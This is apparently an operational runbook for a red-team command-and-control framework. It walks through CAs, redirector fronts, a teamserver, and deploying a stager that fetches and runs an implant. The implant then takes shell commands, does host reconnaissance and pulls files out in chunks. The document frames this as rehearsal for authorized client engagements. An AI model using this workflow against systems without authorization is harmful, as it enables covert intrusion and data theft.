# Rehearsal engagement -- the pre-deployment walk

Operational runbook for the rehearsal every deployment gets before it faces
a client network: one full engagement lifecycle on production-shaped
infrastructure -- an externally provisioned CA, Postgres persistence, a
redirector front with a repoint, a mid-engagement teamserver restart with
audit-chain recovery, and a teardown to report
([architecture.md](../architecture.md) Sec 8, Sec 9, Sec 12.1).

The walk below was executed end to end on a single Linux host (WSL): every
command is real, and the acceptance evidence quoted at the end is what the
run produced. Scale the addresses to the engagement's real infrastructure;
the shape does not change.

## 1. Provision the infrastructure

### The engagement CA (out of band)

The teamserver never generates the production CA
([architecture.md](../architecture.md) Sec 9); provision one with the
operator PKI tooling and hand the teamserver the PEM files:

```
openssl req -x509 -newkey rsa:3072 -nodes \
  -keyout ca.key -out ca.crt -days 3650 \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign" \
  -subj "/O=Rod Rehearsal/CN=Rod Rehearsal Engagement CA"
```

RSA is the only supported CA key type; keep the key off the teamserver
host if the signing posture demands it (only the signing path needs it --
rotation is file replacement plus restart).

### Postgres

Stand up a PostgreSQL instance and apply the schema once per deployment:

```
dotnet ef database update \
  -p src/teamserver/Rod.Persistence -s src/teamserver/Rod.TeamServer \
  --connection "Host=<host>;Port=<port>;Username=<user>;Password=<pass>;Database=rod"
```

### The redirectors

Build and deploy the reference L4 forwarder per
[redirectors.md](redirectors.md) -- one process per front. The rehearsal
topology uses two, primary and fallback:

```
rod-redirector -listen <front-a>:443 -upstream <teamserver-mtls>:9443
rod-redirector -listen <front-b>:443 -upstream <teamserver-mtls>:9443
```

## 2. Configure and start the teamserver

Three listeners make the production shape (bound per the
[teamserver.md](teamserver.md) reference, shown here as environment
variables; `appsettings` sections are equivalent):

| Listener | Transport | Purpose |
|----------|-----------|---------|
| `beacon` | `Mtls` | The implant check-in channel. Public endpoint is the primary redirector; implants present the CA-signed leaf here. |
| `enroll-http` | `Http` | The certificate-less ingress stage-1 rides: enroll and stage-2 fetch hold no leaf yet, so an mTLS listener cannot serve their TLS handshake. In a real deployment the operator's TLS-terminating edge fronts this shape ([architecture.md](../architecture.md) Sec 8); on the rehearsal host it is loopback plain HTTP standing in for that edge. |
| `operator-http` | `Http` | The operator API and UI. Keep it loopback or behind the crew's VPN/TLS edge -- credentials cross it in the clear otherwise. |

```
export Pki__CaCertificatePath=/path/ca.crt
export Pki__CaPrivateKeyPath=/path/ca.key
export ConnectionStrings__Postgres='Host=<host>;Port=<port>;Username=<user>;Password=<pass>;Database=rod'
export Audit__DataDirectory=/path/engagement-data
export Operators__Initial__Handle=lead Operators__Initial__Password=...
export Listeners__0__Name=beacon Listeners__0__Transport=Mtls \
       Listeners__0__BindAddress=0.0.0.0:9443 Listeners__0__PublicEndpoint=https://<front-a>:443
...
dotnet run --project src/teamserver/Rod.TeamServer
```

Startup fails loudly on a missing CA file, an unreachable database, or a
misconfigured listener -- that is the acceptance for step zero.

## 3. Walk the lifecycle

1. **Log in and open the engagement**: `POST /operators/login`, create the
   engagement, mint a stager token (`POST /engagements/{id}/stager-tokens`).
   The secret shows once.
2. **Build the stage-2** with the beacon profile baked: endpoint is the
   enroll ingress, `fallbackEndpoints` carries the fallback front, sleep
   and jitter to the engagement's cadence, kill date to its window.
3. **Build the stage-1 stager** naming the stage-2 (`class: stager`,
   `stage2PayloadId`), download both artifacts.
4. **Deploy**: run the stager where the engagement needs presence. With the
   split topology, name the beacon front and the CA pin:
   `./Rod.Stager -token <secret> -enroll-url https://<edge>/implants/enroll
   -payload <stage2-id> -beacon-url https://<front-a>:443 -ca-cert ca.crt`.
   The stager fetches the stage-2, verifies the baked fingerprint, runs it,
   and hands the credential over; the stage-2 enrols against the external
   CA and appears on the roster (`GET /engagements/{id}/presence`).
5. **Task and collect**: issue verbs over
   `POST /engagements/{id}/tasks`; results land on the task and in the
   audit trail. Bulk collection (`file.pull` of a multi-megabyte file)
   rides the chunked-exfil arm and lands as an engagement artifact.
6. **Crash and recover**: kill the teamserver mid-engagement (the fronts
   keep listening; the implant's beacon loop retries). Restart it. Accept:
   the implant returns to the roster on its own; the audit trail reloads
   with the pre-restart hash chain byte-identical; artifacts remain
   retrievable; operator cookies survive (the data-protection keys and the
   credential store are durable).
7. **Burn a front**: stop the primary redirector. The implant's check-ins
   fail and the baked egress walk advances to the fallback front -- it
   returns to the roster with no operator action. Then repoint the
   listener (`POST /listeners/{id}:repoint` with the fallback front) so
   the server-side record names the live front and the burned one is
   severed. No backend restart, no bind change.
8. **Tear down to report**: retire the implant
   (`POST /engagements/{id}/implants/{implantId}:retire`) -- its session
   closes and the next handshake is refused -- stop the fronts, export the
   report (`GET /engagements/{id}/report`, `?format=markdown`), and
   decommission the infrastructure. The data directory and the report are
   the evidence that outlives the teardown.

## Acceptance evidence from the executed walk

- The lifecycle completed on the shape above: enroll through the split
  topology (stager fetch -> fingerprint check -> stage-2 enroll against
  the external CA), stream-mode beacon through the redirector front,
  `shell.exec` / `file.pull` / `recon.hostenum` round-trips, a 2 MiB
  chunked exfil landing byte-exact as an engagement artifact.
- A `kill -9` mid-engagement followed by a restart: the implant
  reconnected unattended; the 16 pre-crash audit events reloaded with an
  identical hash-chain digest (`md5` over the exported timeline hashes
  before and after matched); the exfil artifact returned its exact bytes;
  the operator session stayed valid across the restart.
- Burning the primary front moved the implant to the baked fallback with
  no operator action; the repoint swapped the listener's public endpoint
  at runtime (bind untouched, `repointedAt` stamped); tasking continued
  through the new front.
- Retire closed the live session and emptied the roster; the exported
  report carried the full arc (4 tasks, 1 artifact, 20 timeline events)
  with its content hash.

The walk also surfaced and fixed a deployment blocker no test had caught:
the shipped configuration's empty `Build:ImplantExtensionDirectory`
string aborted every implant-class payload build. That is the standing
argument for this rehearsal -- it exercises the composed system, not the
slices.
